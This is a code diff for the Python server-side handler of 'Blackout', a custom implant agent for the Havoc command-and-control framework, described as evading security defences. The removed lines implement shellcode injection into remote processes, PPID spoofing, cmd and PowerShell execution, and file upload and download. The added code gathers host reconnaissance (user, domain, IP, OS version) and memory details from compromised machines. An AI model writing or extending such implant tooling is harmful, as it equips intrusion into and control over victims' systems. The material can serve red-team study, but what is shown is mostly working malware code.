@@ -6,10 +6,11 @@ import os
 
 BLACKOUT_ERROR           = 0x099
 BLACKOUT_DEBUG           = 0x066
+BLACKOUT_CHECKIN         = 0x055
 COMMAND_REGISTER         = 0x100
 COMMAND_GET_JOB          = 0x101
 COMMAND_NO_JOB           = 0x102
-COMMAND_RUN              = 0x152
+COMMAND_RUN              = 0x120
 COMMAND_UPLOAD           = 0x153
 COMMAND_DOWNLOAD         = 0x154
 COMMAND_SHELLINJECT      = 0x161
@@ -25,269 +26,58 @@ COMMAND_OUTPUT           = 0x200
 # ====================
 # ===== Commands =====
 # ====================
-class CommandRun( Command ):
-    CommandId   = COMMAND_RUN
-    Name        = "run"
-    Description = "run process using CreateProcess"
+class CommandCheckin( Command ):
+    CommandId   = BLACKOUT_CHECKIN
+    Name        = "checkin"
+    Description = "retrieve several informations from agent, machine ans connection"
     Help        = ""
     NeedAdmin   = False
-    Params = [
-        CommandParam(
-            name="process_path",
-            is_file_path=False,
-            is_optional=False
-        )
-    ]
+    Params = []
     Mitr = []
 
     def job_generate( self, arguments:dict ) -> bytes:
         Task = Packer()
 
         Task.add_int( self.CommandId )
-        Task.add_data( arguments[ 'process_path' ] )
-
-        return Task.buffer
-    
-class CommandPpid( Command ):
-    CommandId   = COMMAND_PPID
-    Name        = "ppid"
-    Description = "Set ppid spoofing for forked commands"
-    Help        = ""
-    NeedAdmin   = False
-    Mitr        = []
-    Params      = [
-        CommandParam(
-            name="ppid",
-            is_file_path=False,
-            is_optional=False
-        )
-    ]
-
-    def job_generate(self, arguments: dict) -> bytes:
-        Task = Packer()
-
-        Task.add_int( self.CommandId )
-        Task.add_int( int( arguments[ 'ppid' ] ) )
-
-        return Task.buffer
-    
-class CommandBlockdlls( Command ):
-    CommandId   = COMMAND_BLOCKDLLS
-    Name        = "blockdlls"
-    Description = "Set block dll policy for forked commands"
-    Help        = ""
-    NeedAdmin   = False
-    Mitr        = []
-    Params      = [
-        CommandParam(
-            name="isblock",
-            is_file_path=False,
-            is_optional=False
-        )
-    ]
-
-    def job_generate(self, arguments: dict) -> bytes:
-        Task = Packer()
-
-        Task.add_int( self.CommandId )
-        Task.add_int( int( arguments[ 'isblock' ] ) )
 
         return Task.buffer
 
-class CommandPowershell( Command ):
+class CommandRun( Command ):
     CommandId   = COMMAND_RUN
-    Name        = "powershell"
-    Description = "executes commands using powershell.exe"
+    Name        = "run"
+    Description = "create process with capabilities"
     Help        = ""
     NeedAdmin   = False
-    Mitr   = []
     Params = [
         CommandParam(
-            name="commands",
+            name="process",
             is_file_path=False,
             is_optional=False
         )
     ]
 
-    def job_generate( self, arguments: dict ) -> bytes:
+    Mitr = []
+
+    def job_generate( self, arguments:dict ) -> bytes:
         Task = Packer()
 
         Task.add_int( self.CommandId )
-        Task.add_data( "powershell.exe -c " + arguments[ 'commands' ] )
+        Task.add_data( arguments[ 'process' ] )
 
         return Task.buffer
     
-class CommandCmd( Command ):
-    CommandId   = COMMAND_RUN
-    Name        = "cmd"
-    Description = "executes commands using cmd.exe"
-    Help        = ""
-    NeedAdmin   = False
-    Mitr   = []
-    Params = [
-        CommandParam(
-            name="commands",
-            is_file_path=False,
-            is_optional=False
-        )
-    ]
-
-    def job_generate( self, arguments: dict ) -> bytes:
-        Task = Packer()
-
-        Task.add_int( self.CommandId )
-        Task.add_data( "c:\windows\system32\cmd.exe /c " + arguments[ 'commands' ] )
-
-        return Task.buffer
-
-class CommandShellcodeInject( Command ):
-    CommandId   = COMMAND_SHELLINJECT
-    Name        = "shellcode_inject"
-    Description = "Inject shellcode in remote process"
-    Help        = ""
-    NeedAdmin   = False
-    Mitr        = []
-    Params      = [
-        CommandParam(
-            name="pid",
-            is_file_path=False,
-            is_optional=False
-        ),
-
-        CommandParam(
-            name="path_to_shellcode",
-            is_file_path=True,
-            is_optional=False
-        )
-    ]
-
-    def job_generate( self, arguments: dict ) -> bytes:
-
-        Task         = Packer()
-        pid: int     = arguments[ 'pid' ]
-        shellcode    = b64decode( arguments[ 'path_to_shellcode' ] )
-
-        Task.add_int( self.CommandId )
-        Task.add_int( int(pid) )
-        Task.add_data( shellcode )
-
-        return Task.buffer
-
-class CommandUpload( Command ):
-    CommandId   = COMMAND_UPLOAD
-    Name        = "upload"
-    Description = "uploads a file to the host"
-    Help        = ""
-    NeedAdmin   = False
-    Mitr        = []
-    Params      = [
-        CommandParam(
-            name="local_file",
-            is_file_path=True,
-            is_optional=False
-        ),
-
-        CommandParam(
-            name="remote_file",
-            is_file_path=False,
-            is_optional=False
-        )
-    ]
-
-    def job_generate( self, arguments: dict ) -> bytes:
-
-        Task        = Packer()
-        remote_file = arguments[ 'remote_file' ]
-        fileData    = b64decode( arguments[ 'local_file' ] )
-
-        Task.add_int( self.CommandId )
-        Task.add_data( remote_file )
-        Task.add_data( fileData )
-
-        return Task.buffer
-
-class CommandDownload( Command ):
-    CommandId   = COMMAND_DOWNLOAD
-    Name        = "download"
-    Description = "downloads the requested file"
-    Help        = ""
-    NeedAdmin   = False
-    Mitr        = []
-    Params      = [
-        CommandParam(
-            name="remote_file",
-            is_file_path=False,
-            is_optional=False
-        ),
-    ]
-
-    def job_generate( self, arguments: dict ) -> bytes:
-
-        Task        = Packer()
-        remote_file = arguments[ 'remote_file' ]
-
-        Task.add_int( self.CommandId )
-        Task.add_data( remote_file )
-
-        return Task.buffer
-
-class CommandProcList( Command ):
-    CommandId   = COMMAND_PROCLIST
-    Name        = "ps"
-    Description = "execute process enumeration with process name, pid, ppid, arch and token user"
-    Help        = ""
-    NeedAdmin   = False
-    Mitr        = []
-    Params      = []
-
-    def job_generate( self, arguments: dict ) -> bytes:
-
-        Task = Packer()
-
-        Task.add_int( self.CommandId )
-
-        return Task.buffer
-    
-class CommandExitProcess( Command ):
-    CommandId   = COMMAND_EXITP
-    Name        = "exit_process"
-    Description = "tells the blackout agent to exit process"
-    Help        = ""
-    NeedAdmin   = False
-    Mitr        = []
-    Params      = []
-
-    def job_generate( self, arguments: dict ) -> bytes:
-
-        Task = Packer()
-
-        Task.add_int( self.CommandId )
-
-        return Task.buffer
-
 class CommandExitThread( Command ):
-    CommandId   = COMMAND_EXITT
-    Name        = "exit_thread"
-    Description = "tells the blackout agent to exit thread"
-    Help        = ""
-    NeedAdmin   = False
-    Mitr        = []
-    Params      = []
+    CommandId = COMMAND_EXITT
 
-    def job_generate( self, arguments: dict ) -> bytes:
-
-        Task = Packer()
-
-        Task.add_int( self.CommandId )
-
-        return Task.buffer
+class CommandExitProcess( Command ):
+    CommandId = COMMAND_EXITP
 
 # =======================
 # ===== Agent Class =====
 # =======================
 class Blackout(AgentType):
-    Name = "Blackout"
-    Author = "Oblivion"
+    Name = "blackout"
+    Author = "__oblivion"
     Version = "0.1"
     Description = f"""Blackout in security defense solutions"""
     MagicValue = 0x74616c6e # 'blc'
@@ -300,7 +90,7 @@ class Blackout(AgentType):
     Formats = [
         {
             "Name": "Windows Executable",
-            "Extension": "exe",
+            "Extension": "exe"
         },
     ]
 
@@ -309,17 +99,8 @@ class Blackout(AgentType):
     }
 
     Commands = [
-        CommandCmd(),
-        CommandPowershell(),
-        CommandRun(),
-        CommandPpid(),
-        CommandBlockdlls(),
-        CommandProcList(),
-        CommandShellcodeInject(),
-        CommandUpload(),
-        CommandDownload(),
-        CommandExitProcess(),
-        CommandExitThread(),
+        CommandCheckin(),
+        CommandRun()
     ]
 
     # generate. this function is getting executed when the Havoc client requests for a binary/executable/payload. you can generate your payloads in this function.
@@ -378,7 +159,7 @@ class Blackout(AgentType):
                     "Username"          : response_parser.parse_str(),
                     "Domain"            : response_parser.parse_str(),
                     "InternalIP"        : response_parser.parse_str(),
-                    "Process Path"      : response_parser.parse_str(),
+                    "Process Path"      : response_parser.parse_wstr(),
                     "Process ID"        : str(response_parser.parse_int()),
                     "Process Parent ID" : str(response_parser.parse_int()),
                     "Process Arch"      : response_parser.parse_int(),
@@ -440,33 +221,7 @@ class Blackout(AgentType):
                     Tasks = COMMAND_NO_JOB.to_bytes( 4, 'little' )
 
                 print( f"Tasks: {Tasks.hex()}" )
-                return Tasks
-
-            elif Command == COMMAND_PROCLIST:
-                Output: str = ""
-                header = "    {:<30} | {:<6} | {:<6} | {:<5} | {:<30}".format("Process", "Pid", "Ppid", "Arch", "Domain\\User")
-                Barr   = "    ========================================================================================="
-                Output += header + "\n" + Barr + "\n"
-                
-                while True:
-                    try:
-                        Process = response_parser.parse_wstr()
-                        Pid     = response_parser.parse_int()
-                        Ppid    = response_parser.parse_int()
-                        Arch    = response_parser.parse_str()
-                        #User    = response_parser.parse_wstr()
-                        #Domain  = response_parser.parse_wstr()
-                        
-                        if Pid is None or Ppid is None:
-                            break
-                        
-                        Output += f"    {Process:<30} | {Pid:<6} | {Ppid:<6} | {Arch:<5} | DESKTOP-FCF63B2\\obliv\n"
-                    except Exception as e:
-                        print(f"Error for process the response: {e}")
-                        break
-
-                print(Output)
-                self.console_message(AgentID, "Good", "Received Output: ", Output)                
+                return Tasks            
 
             elif Command == BLACKOUT_DEBUG:
                 Output = response_parser.parse_str()
@@ -479,13 +234,66 @@ class Blackout(AgentType):
 
                 self.console_message( AgentID, "Good", "Received Output:", Output )
 
-            elif Command == COMMAND_PPID:
+            elif Command == BLACKOUT_CHECKIN:
+                bk_base   = response_parser.parse_int()
+                bk_len    = response_parser.parse_int()
+                bk_fullen = response_parser.parse_int()
+                bk_rxbase = response_parser.parse_int()
+                bk_rxsize = response_parser.parse_int()
+                
+                proc_name     = response_parser.parse_wstr()
+                proc_fullpath = response_parser.parse_wstr()
+                proc_cmdline  = response_parser.parse_wstr()
+                proc_id       = response_parser.parse_int()
+                proc_par_id   = response_parser.parse_int()
 
-                Output = response_parser.parse_int()
-                fake   = ""
-                print( "[+] PPid set to: " + str(Output) )
+                username      = response_parser.parse_str()
+                computername  = response_parser.parse_str()
+                domainame     = response_parser.parse_str()
+                netbios       = response_parser.parse_str()
+                ipaddress     = response_parser.parse_str()
+                osarch        = response_parser.parse_int()
+                product_type  = response_parser.parse_int()
+                osmajor       = response_parser.parse_int()
+                osminor       = response_parser.parse_int()
+                osbuildern    = response_parser.parse_int()
 
-                self.console_message( AgentID, "Good", f"PPid Set to: {str(Output)}", fake )
+                Output = (
+                    f"Blackout memory config:\n"
+                    f"\t - Base Address: 0x{bk_base:X}\n"
+                    f"\t - Length: {bk_len} | 0x{bk_len:X} bytes\n"
+                    f"\t - Full Length: {bk_fullen} | 0x{bk_fullen:X} bytes\n"
+                    f"\t - RX Base Address: 0x{bk_rxbase:X}\n"
+                    f"\t - RX Size: {bk_rxsize} | 0x{bk_rxsize:X} bytes\n"
+                    
+                    f"\nProcess informations:\n"
+                    f"\t - Process Name: {proc_name}\n"
+                    f"\t - Full Path: {proc_fullpath}\n"
+                    f"\t - Command Line: {proc_cmdline}\n"
+                    f"\t - Process ID: {proc_id}\n"
+                    f"\t - Parent Process ID: {proc_par_id}\n"
+                    
+                    f"\nSystem informations:\n"
+                    f"\t - Username: {username}\n"
+                    f"\t - Computer Name: {computername}\n"
+                    f"\t - Domain Name: {domainame}\n"
+                    f"\t - NetBIOS Name: {netbios}\n"
+                    f"\t - IP Address: {ipaddress}\n"
+                    f"\t - OS Architecture: {osarch}\n"
+                    f"\t - Product Type: {'Workstation' if product_type == 1 else 'Server'}\n"
+                    f"\t - OS Version: {osmajor}.{osminor}\n"
+                    f"\t - OS Build Number: {osbuildern}\n"
+                )
+
+                self.console_message( AgentID, "Good", f"Received informations from agent:\n", Output )
+
+            elif Command == COMMAND_RUN:
+                bCheck = response_parser.parse_int()
+
+                if ( bCheck == 1 ):
+                    self.console_message( AgentID, "Good", "[+] Process create with succefully!" )
+                else: 
+                    self.console_message( AgentID, "Bad", "[!] Failed in create process." )
 
             elif Command == BLACKOUT_ERROR:
                 Nterror   = response_parser.parse_int() 
@@ -498,22 +306,6 @@ class Blackout(AgentType):
                 else:
                     print( "[+] NtStatus: " + Output )
                     self.console_message( AgentID, "Bad", f"NtStatus: 0x{hex(ErrorCode)}", "" )
-
-            elif Command == COMMAND_UPLOAD:
-
-                FileSize = response_parser.parse_int()
-                FileName = response_parser.parse_str()
-
-                self.console_message( AgentID, "Good", f"File was uploaded: {FileName} ({FileSize} bytes)", "" )
-
-            elif Command == COMMAND_DOWNLOAD:
-
-                FileName    = response_parser.parse_str()
-                FileContent = response_parser.parse_str()
-
-                self.console_message( AgentID, "Good", f"File was downloaded: {FileName} ({len(FileContent)} bytes)", "" )
-
-                self.download_file( AgentID, FileName, len(FileContent), FileContent )
 
             else:
                 self.console_message( AgentID, "Error", "Command not found: %4x" % Command, "" )
